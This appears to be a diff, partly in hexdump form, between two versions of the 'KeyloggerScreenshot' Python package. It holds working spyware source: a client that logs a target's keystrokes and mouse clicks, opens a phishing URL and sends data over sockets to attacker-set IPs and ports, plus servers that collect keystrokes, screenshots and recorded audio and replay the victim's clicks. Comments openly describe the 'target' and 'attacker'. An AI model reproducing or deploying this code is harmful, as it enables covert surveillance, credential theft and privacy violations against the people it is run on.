+00002050: 7422 0d0a 0d0a 2020 2020 6465 6620 6f6e  t"....    def on
+00002060: 5f70 7265 7373 2873 656c 662c 206b 6579  _press(self, key
+00002070: 293a 0d0a 2020 2020 2020 2020 7472 793a  ):..        try:
+00002080: 0d0a 2020 2020 2020 2020 2020 2020 7472  ..            tr
+00002090: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
+000020a0: 2020 2020 6f74 6865 725f 6368 6172 6563      other_charec
+000020b0: 7465 7273 203d 207b 2231 223a 2022 2122  ters = {"1": "!"
+000020c0: 2c20 2232 223a 2027 2227 2c20 2233 223a  , "2": '"', "3":
+000020d0: 2022 c2a7 222c 2022 3422 3a20 2224 222c   "..", "4": "$",
+000020e0: 2022 3522 3a20 2225 222c 2022 3622 3a20   "5": "%", "6": 
+000020f0: 2226 222c 2022 3722 3a20 222f 222c 2022  "&", "7": "/", "
+00002100: 3822 3a20 2228 222c 0d0a 2020 2020 2020  8": "(",..      
+00002110: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002120: 2020 2020 2020 2020 2020 2020 2020 2239                "9
+00002130: 223a 2022 2922 2c20 2230 223a 2022 3d22  ": ")", "0": "="
+00002140: 2c20 22c3 9f22 3a20 223f 227d 0d0a 2020  , "..": "?"}..  
+00002150: 2020 2020 2020 2020 2020 2020 2020 6966                if
+00002160: 2073 656c 662e 6361 7073 2069 7320 5472   self.caps is Tr
+00002170: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
+00002180: 2020 2020 2020 2020 2069 6620 6b65 792e           if key.
+00002190: 6368 6172 2069 6e20 6f74 6865 725f 6368  char in other_ch
+000021a0: 6172 6563 7465 7273 3a0d 0a20 2020 2020  arecters:..     
+000021b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000021c0: 2020 2077 6f72 6420 3d20 6f74 6865 725f     word = other_
+000021d0: 6368 6172 6563 7465 7273 5b6b 6579 2e63  charecters[key.c
+000021e0: 6861 725d 0d0a 2020 2020 2020 2020 2020  har]..          
+000021f0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+00002200: 5570 7065 7220 4368 6172 6163 7465 7273  Upper Characters
+00002210: 2066 726f 6d20 2231 2220 746f 2022 3022   from "1" to "0"
+00002220: 2062 6563 6175 7365 2061 6c6c 2074 6869   because all thi
+00002230: 7320 6e75 6d62 6572 7320 6172 6520 6e6f  s numbers are no
+00002240: 7420 6368 6172 6563 7465 7273 2061 7265  t charecters are
+00002250: 206e 6f74 2069 6e20 7079 6e70 7574 0d0a   not in pynput..
+00002260: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002270: 2020 2020 656c 7365 3a0d 0a20 2020 2020      else:..     
+00002280: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002290: 2020 2077 6f72 6420 3d20 6b65 792e 6368     word = key.ch
+000022a0: 6172 2e75 7070 6572 2829 0d0a 2020 2020  ar.upper()..    
+000022b0: 2020 2020 2020 2020 2020 2020 656c 7365              else
+000022c0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+000022d0: 2020 2020 2020 2077 6f72 6420 3d20 6b65         word = ke
+000022e0: 792e 6368 6172 0d0a 0d0a 2020 2020 2020  y.char....      
+000022f0: 2020 2020 2020 2020 2020 616c 6c5f 7265            all_re
+00002300: 715f 6b65 7973 203d 207b 2203 223a 2073  q_keys = {".": s
+00002310: 656c 662e 636f 7079 5f64 6174 612c 2022  elf.copy_data, "
+00002320: 1622 3a20 7365 6c66 2e61 7070 656e 645f  .": self.append_
+00002330: 7061 7374 657d 0d0a 2020 2020 2020 2020  paste}..        
+00002340: 2020 2020 2020 2020 666f 7220 6561 6368          for each
+00002350: 5f6b 6579 2069 6e20 616c 6c5f 7265 715f  _key in all_req_
+00002360: 6b65 7973 3a0d 0a20 2020 2020 2020 2020  keys:..         
+00002370: 2020 2020 2020 2020 2020 2069 6620 6561             if ea
+00002380: 6368 5f6b 6579 203d 3d20 6b65 792e 6368  ch_key == key.ch
+00002390: 6172 3a0d 0a20 2020 2020 2020 2020 2020  ar:..           
+000023a0: 2020 2020 2020 2020 2020 2020 2061 6c6c               all
+000023b0: 5f72 6571 5f6b 6579 735b 6561 6368 5f6b  _req_keys[each_k
+000023c0: 6579 5d28 290d 0a20 2020 2020 2020 2020  ey]()..         
+000023d0: 2020 2020 2020 2074 7279 3a0d 0a20 2020         try:..   
+000023e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000023f0: 2061 7363 695f 6e75 6d62 6572 203d 206f   asci_number = o
+00002400: 7264 2877 6f72 6429 0d0a 2020 2020 2020  rd(word)..      
+00002410: 2020 2020 2020 2020 2020 2020 2020 6966                if
+00002420: 2061 7363 695f 6e75 6d62 6572 206e 6f74   asci_number not
+00002430: 2069 6e20 7261 6e67 6528 302c 2033 3229   in range(0, 32)
+00002440: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
+00002450: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002460: 7072 696e 745f 776f 726b 2877 6f72 6429  print_work(word)
+00002470: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+00002480: 2020 2020 6578 6365 7074 2054 7970 6545      except TypeE
+00002490: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+000024a0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+000024b0: 7072 696e 745f 776f 726b 2877 6f72 6429  print_work(word)
+000024c0: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+000024d0: 2020 2020 7072 696e 7428 7365 6c66 2e72      print(self.r
+000024e0: 6963 6874 6967 655f 6c69 7374 6529 0d0a  ichtige_liste)..
+000024f0: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+00002500: 7074 2054 7970 6545 7272 6f72 3a0d 0a20  pt TypeError:.. 
+00002510: 2020 2020 2020 2020 2020 2020 2020 2070                 p
+00002520: 6173 730d 0a0d 0a20 2020 2020 2020 2065  ass....        e
+00002530: 7863 6570 7420 4174 7472 6962 7574 6545  xcept AttributeE
+00002540: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+00002550: 2020 2070 7269 6e74 2866 2745 696e 6520     print(f'Eine 
+00002560: 616e 6465 7265 2054 6173 7465 2077 7572  andere Taste wur
+00002570: 6465 2067 6564 72c3 bc63 6b74 3a20 7b6b  de gedr..ckt: {k
+00002580: 6579 7d27 290d 0a20 2020 2020 2020 2020  ey}')..         
+00002590: 2020 2069 6620 6b65 7920 3d3d 206b 6579     if key == key
+000025a0: 626f 6172 642e 4b65 792e 7370 6163 6520  board.Key.space 
+000025b0: 6f72 206b 6579 203d 3d20 6b65 7962 6f61  or key == keyboa
+000025c0: 7264 2e4b 6579 2e74 6162 3a0d 0a20 2020  rd.Key.tab:..   
+000025d0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+000025e0: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+000025f0: 202b 3d20 227b 220d 0a20 2020 2020 2020   += "{"..       
+00002600: 2020 2020 2020 2020 2023 2049 6620 7468           # If th
+00002610: 6520 7461 7267 6574 2070 7265 7373 6573  e target presses
+00002620: 2074 6162 206f 7220 7370 6163 6520 6120   tab or space a 
+00002630: 227b 2220 7769 6c6c 2062 6520 6170 7065  "{" will be appe
+00002640: 6e64 6564 2074 6f20 7468 6520 6c69 7374  nded to the list
+00002650: 2073 6f20 7468 6520 6174 7461 636b 6572   so the attacker
+00002660: 206b 6e6f 7773 2077 6865 6e20 616e 640d   knows when and.
+00002670: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002680: 2023 2073 7061 6365 206f 7220 6120 7461   # space or a ta
+00002690: 6220 6b65 7920 6861 7320 6265 656e 2070  b key has been p
+000026a0: 7265 7373 6564 0d0a 2020 2020 2020 2020  ressed..        
+000026b0: 2020 2020 656c 6966 206b 6579 203d 3d20      elif key == 
+000026c0: 6b65 7962 6f61 7264 2e4b 6579 2e63 6170  keyboard.Key.cap
+000026d0: 735f 6c6f 636b 3a0d 0a20 2020 2020 2020  s_lock:..       
+000026e0: 2020 2020 2020 2020 2073 656c 662e 6361           self.ca
+000026f0: 7073 203d 2054 7275 650d 0a20 2020 2020  ps = True..     
+00002700: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002710: 6368 6563 6b2e 6170 7065 6e64 2831 290d  check.append(1).
+00002720: 0a20 2020 2020 2020 2020 2020 2063 6865  .            che
+00002730: 636b 5f63 6170 7320 3d20 7375 6d28 7365  ck_caps = sum(se
+00002740: 6c66 2e63 6865 636b 2920 2f20 320d 0a20  lf.check) / 2.. 
+00002750: 2020 2020 2020 2020 2020 2023 2049 6620             # If 
+00002760: 6368 6563 6b5f 6361 7073 2069 7320 6e6f  check_caps is no
+00002770: 7420 7072 696d 6172 7920 6974 2077 696c  t primary it wil
+00002780: 6c20 7365 7420 7365 6c66 2e63 6170 7320  l set self.caps 
+00002790: 746f 2046 616c 7365 0d0a 0d0a 2020 2020  to False....    
+000027a0: 2020 2020 2020 2020 6966 2073 7472 2863          if str(c
+000027b0: 6865 636b 5f63 6170 7329 5b2d 315d 2021  heck_caps)[-1] !
+000027c0: 3d20 2730 273a 0d0a 2020 2020 2020 2020  = '0':..        
+000027d0: 2020 2020 2020 2020 7061 7373 0d0a 2020          pass..  
+000027e0: 2020 2020 2020 2020 2020 656c 7365 3a0d            else:.
+000027f0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002800: 2073 656c 662e 6361 7073 203d 2046 616c   self.caps = Fal
+00002810: 7365 0d0a 0d0a 2020 2020 6465 6620 6f6e  se....    def on
+00002820: 5f72 656c 6561 7365 2873 656c 662c 206b  _release(self, k
+00002830: 6579 293a 0d0a 2020 2020 2020 2020 7072  ey):..        pr
+00002840: 696e 7428 6627 4b65 7920 7265 6c65 6173  int(f'Key releas
+00002850: 6564 3a20 7b6b 6579 7d27 290d 0a0d 0a20  ed: {key}').... 
+00002860: 2020 2064 6566 2073 7461 7274 2873 656c     def start(sel
+00002870: 6629 3a0d 0a20 2020 2020 2020 2069 6620  f):..        if 
+00002880: 7365 6c66 2e70 6869 7368 696e 6720 6973  self.phishing is
+00002890: 206e 6f74 204e 6f6e 653a 0d0a 2020 2020   not None:..    
+000028a0: 2020 2020 2020 2020 7768 696c 6520 5472          while Tr
+000028b0: 7565 3a0d 0a20 2020 2020 2020 2020 2020  ue:..           
+000028c0: 2020 2020 2074 7279 3a0d 0a20 2020 2020       try:..     
+000028d0: 2020 2020 2020 2020 2020 2020 2020 2072                 r
+000028e0: 6573 706f 6e73 6520 3d20 7265 7175 6573  esponse = reques
+000028f0: 7473 2e67 6574 2873 656c 662e 7068 6973  ts.get(self.phis
+00002900: 6869 6e67 290d 0a20 2020 2020 2020 2020  hing)..         
+00002910: 2020 2020 2020 2020 2020 2023 5265 7370             #Resp
+00002920: 6f6e 6520 6973 2068 6572 6520 746f 2073  one is here to s
+00002930: 6565 2069 6620 7468 6520 7765 6273 6974  ee if the websit
+00002940: 6520 6973 206f 6e6c 696e 6520 6f72 206e  e is online or n
+00002950: 6f74 0d0a 2020 2020 2020 2020 2020 2020  ot..            
+00002960: 2020 2020 2020 2020 7765 6262 726f 7773          webbrows
+00002970: 6572 2e6f 7065 6e28 7365 6c66 2e70 6869  er.open(self.phi
+00002980: 7368 696e 6729 0d0a 2020 2020 2020 2020  shing)..        
+00002990: 2020 2020 2020 2020 2020 2020 6272 6561              brea
+000029a0: 6b0d 0a0d 0a20 2020 2020 2020 2020 2020  k....           
+000029b0: 2020 2020 2065 7863 6570 7420 7265 7175       except requ
+000029c0: 6573 7473 2e65 7863 6570 7469 6f6e 732e  ests.exceptions.
+000029d0: 436f 6e6e 6563 7469 6f6e 4572 726f 723a  ConnectionError:
+000029e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000029f0: 2020 2020 2020 7072 696e 7428 224e 6f20        print("No 
+00002a00: 636f 6e6e 6563 7469 6f6e 2229 0d0a 2020  connection")..  
+00002a10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002a20: 2020 7379 732e 6578 6974 2829 0d0a 0d0a    sys.exit()....
+00002a30: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
+00002a40: 675f 7468 7265 6164 203d 2074 6872 6561  g_thread = threa
+00002a50: 6469 6e67 2e54 6872 6561 6428 7461 7267  ding.Thread(targ
+00002a60: 6574 3d73 656c 662e 6461 7465 6e5f 6175  et=self.daten_au
+00002a70: 666e 6568 656d 656e 290d 0a20 2020 2020  fnehemen)..     
+00002a80: 2020 2023 2054 6869 7320 7275 6e73 2074     # This runs t
+00002a90: 6865 2070 726f 6772 616d 6d20 6265 6869  he programm behi
+00002aa0: 6e64 2074 6865 2061 6374 7561 6c20 7072  nd the actual pr
+00002ab0: 6f67 7261 6d6d 696e 670d 0a20 2020 2020  ogramming..     
+00002ac0: 2020 206c 6973 7465 6e69 6e67 5f74 6872     listening_thr
+00002ad0: 6561 642e 7374 6172 7428 290d 0a0d 0a20  ead.start().... 
+00002ae0: 2020 2020 2020 2074 6872 6561 6469 6e67         threading
+00002af0: 5f6d 6f75 7365 203d 2074 6872 6561 6469  _mouse = threadi
+00002b00: 6e67 2e54 6872 6561 6428 7461 7267 6574  ng.Thread(target
+00002b10: 3d73 656c 662e 616c 6c5f 636c 6963 6b73  =self.all_clicks
+00002b20: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
+00002b30: 7320 7275 6e73 2074 6865 2070 726f 6772  s runs the progr
+00002b40: 616d 6d20 6265 6869 6e64 2074 6865 2061  amm behind the a
+00002b50: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
+00002b60: 670d 0a20 2020 2020 2020 2074 6872 6561  g..        threa
+00002b70: 6469 6e67 5f6d 6f75 7365 2e73 7461 7274  ding_mouse.start
+00002b80: 2829 0d0a 0d0a 2020 2020 2020 2020 7365  ()....        se
+00002b90: 6e64 5f74 696d 6572 203d 2073 6f63 6b65  nd_timer = socke
+00002ba0: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
+00002bb0: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
+00002bc0: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
+00002bd0: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+00002be0: 2e63 6f6e 6e65 6374 2828 7365 6c66 2e69  .connect((self.i
+00002bf0: 705f 7469 6d65 722c 2073 656c 662e 706f  p_timer, self.po
+00002c00: 7274 5f74 696d 6572 2929 0d0a 0d0a 2020  rt_timer))....  
+00002c10: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+00002c20: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
+00002c30: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
+00002c40: 2929 0d0a 2020 2020 2020 2020 2320 5468  ))..        # Th
+00002c50: 6973 2073 656e 6473 2074 6865 2073 6563  is sends the sec
+00002c60: 6f6e 6473 2074 6f20 7468 6520 7365 7276  onds to the serv
+00002c70: 6572 0d0a 2020 2020 2020 2020 7365 6e64  er..        send
+00002c80: 5f74 696d 6572 2e63 6c6f 7365 2829 0d0a  _timer.close()..
+00002c90: 0d0a 2020 2020 2020 2020 7769 7468 206b  ..        with k
+00002ca0: 6579 626f 6172 642e 4c69 7374 656e 6572  eyboard.Listener
+00002cb0: 286f 6e5f 7072 6573 733d 7365 6c66 2e6f  (on_press=self.o
+00002cc0: 6e5f 7072 6573 732c 206f 6e5f 7265 6c65  n_press, on_rele
+00002cd0: 6173 653d 7365 6c66 2e6f 6e5f 7265 6c65  ase=self.on_rele
+00002ce0: 6173 6529 2061 7320 6c69 7374 656e 6572  ase) as listener
+00002cf0: 3a0d 0a20 2020 2020 2020 2020 2020 2073  :..            s
+00002d00: 656c 662e 636f 756e 7464 6f77 6e5f 7365  elf.countdown_se
+00002d10: 6e64 2873 656c 662e 6475 7261 7469 6f6e  nd(self.duration
+00002d20: 2c20 7365 6c66 2e69 705f 7068 6f74 6f73  , self.ip_photos
+00002d30: 2c20 7365 6c66 2e70 6f72 745f 7068 6f74  , self.port_phot
+00002d40: 6f73 2c20 7365 6c66 2e69 705f 6b65 796c  os, self.ip_keyl
+00002d50: 6f67 6765 722c 0d0a 2020 2020 2020 2020  ogger,..        
+00002d60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002d70: 2020 2020 2020 2020 7365 6c66 2e70 6f72          self.por
+00002d80: 745f 6b65 796c 6f67 6765 7229 0d0a 2020  t_keylogger)..  
+00002d90: 2020 2020 2020 2020 2020 6c69 7374 656e            listen
+00002da0: 6572 2e6a 6f69 6e28 290d 0a20 2020 2020  er.join()..     
+00002db0: 2020 2020 2020 2023 2054 6869 7320 6c69         # This li
+00002dc0: 7374 656e 7320 746f 2074 6865 206b 6579  stens to the key
+00002dd0: 7320 7468 6174 2077 6865 7265 2074 7970  s that where typ
+00002de0: 6564                                     ed
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Port_data.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,39 +1,42 @@
 import subprocess
 import sys
 
-def get_working_ports():
-    if sys.platform != "linux":
-        #Only here for windows
-        cmd = subprocess.check_output(["netstat", "-ano"])
-        #This command shows all the ports on your pc
-        all = cmd.split()
-
-        working_ports = []
-        zahlen = [str(zahl) for zahl in range(0, 11)]
-        #makes a range of numbers from 0 to 10
-
-        for each in all:
-            str_each = str(each)
-            if ":" in str_each:
-                switch = str_each[::-1]
-                # for e.g "0.0.0.0:1352" will be turned around to 5312:0.0.0.0 so it's easier to parse trough
-                this_port = ""
-                for port in switch:
-                    if port not in zahlen: pass
-                    #This gets all unnecessary charecters away
-                    if port == ":": break
-                    #Check if number are there if ":" is there it will stop
-                    this_port += port
-                    #If all this conditions aren't true it will form to a number
-
-                another_switch = this_port[::-1]
-                #from our example "this_port" will contain "5312" to get the original port we are just flipping the port again
-                if "'" in another_switch: another_switch = another_switch.replace("'", "")
-
-                if len(another_switch) == 4:
-                    #Only ports with the length of 4 digits will go through because we only use 4 digits for the ports in KeyloggerScreenshot
-                    working_ports.append(another_switch)
-        return working_ports
-        #If everything is good it will return all other ports
-    return None
-    #This is only for os other than windwos
+class Ports:
+
+    @staticmethod
+    def get_working_ports():
+        if sys.platform != "linux":
+            # Only here for windows
+            cmd = subprocess.check_output(["netstat", "-ano"])
+            # This command shows all the ports on your pc
+            all = cmd.split()
+
+            working_ports = []
+            zahlen = [str(zahl) for zahl in range(0, 11)]
+            # makes a range of numbers from 0 to 10
+
+            for each in all:
+                str_each = str(each)
+                if ":" in str_each:
+                    switch = str_each[::-1]
+                    # for e.g "0.0.0.0:1352" will be turned around to 5312:0.0.0.0 so it's easier to parse trough
+                    this_port = ""
+                    for port in switch:
+                        if port not in zahlen: pass
+                        # This gets all unnecessary charecters away
+                        if port == ":": break
+                        # Check if number are there if ":" is there it will stop
+                        this_port += port
+                        # If all this conditions aren't true it will form to a number
+
+                    another_switch = this_port[::-1]
+                    # from our example "this_port" will contain "5312" to get the original port we are just flipping the port again
+                    if "'" in another_switch: another_switch = another_switch.replace("'", "")
+
+                    if len(another_switch) == 4:
+                        # Only ports with the length of 4 digits will go through because we only use 4 digits for the ports in KeyloggerScreenshot
+                        working_ports.append(another_switch)
+            return working_ports
+            # If everything is good it will return all other ports
+        return None
+        # This is only for os other than windwos
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_keylogger.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import time
 import sys
 import socket
 import os
 import BetterPrinting as bp
 from .Server_photos import ServerPhotos
-from .Port_data import get_working_ports
-from .Simulation_code import start_simulation
+from .Port_data import Ports
+from .Simulation_code import Simulation
 
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
     def __init__(self, ip, port, simulater=False):
         self.ip = ip
         self.port = port
         self.simulater = simulater
@@ -115,16 +115,16 @@
 
             if self.simulater is True:
                 print("Simulation will come in 10 seconds!!!")
                 time.sleep(10)
                 start = input("Do you want to start y/n?: ")
                 if start not in ["y", "yes"]:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-                    sys.exit()
+                    os._exit(0)
 
-                start_simulation()
+                Simulation.start_simulation()
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use", "magenta")
                 os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_listener.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import sys
 import socket
 import os
 import wave
 import ast
 import BetterPrinting as bp
 from .Server_photos import ServerPhotos
-from .Port_data import get_working_ports
+from .Port_data import Ports
 
 class ServerListener:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
         self.filename = None
 
@@ -55,11 +55,11 @@
             data_file.writeframes(b''.join(frames))
             data_file.close()
             bp.color(f'"{filename}" has been saved to your directory', "green")
 
             # This stores everything the target was talking
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERLISTENER. PORT NUMBER: {self.port} already in use","green")
                 os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_photos.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 import socket
 import os
 import BetterPrinting as bp
-from .Port_data import get_working_ports
+from .Port_data import Ports
 
 class ServerPhotos:
     # This is the class of the Server. Both Server should not be in the same file
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
         self.full_msg = None
@@ -76,11 +76,11 @@
                     bp.color(f"{anzahl} Images has been saved to your working directory", "cyan")
                 else:
                     bp.color(f"{anzahl} Image have been saved to your working directory", "cyan")
                 # Detetcts how many Image have been saved to your directory
 
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERPHOTOS. PORT NUMBER: {self.port} already in use", "cyan")
                 os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Server_timer.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 import time
 import socket
 from .Server_photos import ServerPhotos
-from .Port_data import get_working_ports
+from .Port_data import Ports
 import os
 
 class Timer:
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port
 
@@ -38,11 +38,11 @@
 
             client_socket, ipaddress = show_time.accept()
             full_msg = ServerPhotos.get_data(self, client_socket, "r", 10)
             seconds = int(full_msg)
             self.countdown(seconds)
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 print(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use")
                 os._exit(0)
```

### Comparing `KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Simulation_code.py` & `KeyloggerScreenshot-0.2.9.1/KeyloggerScreenshot/Simulation_code.py`

 * *Files 13% similar despite different names*

```diff
@@ -2,118 +2,127 @@
 import pyautogui as pg
 import sys
 import os
 import ast
 import time
 import PIL.Image
 import tkinter as tk
+import BetterPrinting as bp
 
-def countdown():
-    global seconds
-    global startbutton
-    global tkWindow
-    real_sec = seconds
-    seconds = seconds + 4
-    # Plus four seconds because of the time the code sleeps
-
-    if sys.platform == "linux": size = "295x367"
-    else: size = "250x415"
-
-    tkWindow = tk.Tk()
-    tkWindow.geometry(size)
-    tkWindow.title('KeyloggerScreenshot')
-    minutes = seconds // 60
-    this_min = minutes * 60
-    this_sec = seconds - this_min
-    print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
-
-    while seconds:  # Same like Timer Class
-        mins, secs = divmod(seconds, 60)
-        timer = '{:02d}:{:02d}'.format(mins, secs)
-        print(f"\rTime left: {timer}", end="")
-        time.sleep(1)
-        seconds -= 1
-    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-    # GUI BY: DYMA020
-    startbutton = tk.Button(tkWindow, text="Stop stimulation", command=changecol, height=10, width=30)
-    # Puts everything on place
-    startbutton.grid(row=1, column=0)
-    if real_sec < 60:
-        text = f"Simulation for {real_sec} seconds"
-    else:
-        m, s = divmod(real_sec, 60)
-        timer = '{:02d}:{:02d}'.format(m, s)
-        text = f"Simulation for {timer} minutes"
-    # Just for decoration
-    tk.Button(tkWindow, text=text, command=connection, height=10, width=30).grid(row=2, column=0)
-    tkWindow.mainloop()
-
-
-def changecol():  # This function is here to if the simulation has ended
-    startbutton.configure(bg="red")
-    # This is the button
-    startbutton["text"] = "Stop simulation"
-    tkWindow.destroy()
-
-
-def connection():
-    print("Successful connection")
-
-def start_simulation():
-    global seconds
-    mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
-    #Looks for coordinates in mouseInfoLog
-
-    if not mouse_coordinates:
-        #If there isn't a file called mouseInfoLog it will destroy itself
-        print("\nThe target hasn't clicked anything")
-        print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
-        sys.exit()
-
-    every_coordinate = []
-    for each_core in mouse_coordinates:
-        fhandle = open(each_core)
-        for line in fhandle:
-            if "[" in line:
-                every_coordinate += ast.literal_eval(line)
-                #This makes a list out of a string
-
-    img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
-    #This checks for all Images in the directory
-
-    if not img_files:
-        print('There is no "New_Image" in this directory')
-        sys.exit()
-
-    pg.FAILSAFE = False
-    #This is for the corner allowance
-    img_seconds = 5.572
-    #This is the speed it takes to open the image
-    speed = 0.47
-    #This is the time each coordinate needs
-    sleep = 1.5
-    #This is the time where the code is taking a time out
-    one_coordinate = speed + sleep
-
-    duration_seconds = one_coordinate * len(every_coordinate)
-    one_image = duration_seconds + img_seconds
-    summed_up = one_image * len(img_files)
-    seconds = round(summed_up)
-    #This calculates the amount it will take
-
-    print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
-    threading_count = threading.Thread(target=countdown)
-    #The countdown will start
-    threading_count.start()
-
-    pg.sleep(4)
-    for image in img_files:
-        im = PIL.Image.open(image)
-        #Opens the image
-        im.show()
-        time.sleep(2)
-        pg.press("f11")
-        # Makes the image in the perfect resolution
-        for x, y in every_coordinate:
-            pg.moveTo(x, y, 0.3)
-            time.sleep(sleep)
-        pg.press("esc")
+class Simulation:
+
+    @staticmethod
+    def countdown():
+        global seconds
+        global startbutton
+        global tkWindow
+        real_sec = seconds
+        seconds = seconds + 4
+        # Plus four seconds because of the time the code sleeps
+
+        if sys.platform == "linux": size = "295x367"
+        else: size = "250x415"
+
+        tkWindow = tk.Tk()
+        tkWindow.geometry(size)
+        tkWindow.title('KeyloggerScreenshot')
+        minutes = seconds // 60
+        this_min = minutes * 60
+        this_sec = seconds - this_min
+        print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")
+
+        while seconds:  # Same like Timer Class
+            mins, secs = divmod(seconds, 60)
+            timer = '{:02d}:{:02d}'.format(mins, secs)
+            print(f"\rTime left: {timer}", end="")
+            time.sleep(1)
+            seconds -= 1
+        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+        # GUI BY: DYMA020
+        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=Simulation.changecol, height=10, width=30)
+        # Puts everything on place
+        startbutton.grid(row=1, column=0)
+        if real_sec < 60:
+            text = f"Simulation for {real_sec} seconds"
+        else:
+            m, s = divmod(real_sec, 60)
+            timer = '{:02d}:{:02d}'.format(m, s)
+            text = f"Simulation for {timer} minutes"
+        # Just for decoration
+        tk.Button(tkWindow, text=text, command=Simulation.connection, height=10, width=30).grid(row=2, column=0)
+        tkWindow.mainloop()
+
+    @staticmethod
+    def changecol():  # This function is here to if the simulation has ended
+        startbutton.configure(bg="red")
+        # This is the button
+        startbutton["text"] = "Stop simulation"
+        os._exit(0)
+
+    @staticmethod
+    def connection():
+        print("Successful connection")
+
+    @staticmethod
+    def start_simulation():
+        global seconds
+        mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
+        #Looks for coordinates in mouseInfoLog
+
+        if not mouse_coordinates:
+            #If there isn't a file called mouseInfoLog it will destroy itself
+            print("\nThe target hasn't clicked anything")
+            print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
+            sys.exit()
+
+        every_coordinate = []
+        for each_core in mouse_coordinates:
+            fhandle = open(each_core)
+            for line in fhandle:
+                if "[" in line:
+                    every_coordinate += ast.literal_eval(line)
+                    #This makes a list out of a string
+
+        img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
+        #This checks for all Images in the directory
+
+        if not img_files:
+            print('There is no "New_Image" in this directory')
+            sys.exit()
+
+        pg.FAILSAFE = False
+        #This is for the corner allowance
+        img_seconds = 5.572
+        #This is the speed it takes to open the image
+        speed = 0.47
+        #This is the time each coordinate needs
+        sleep = 1.5
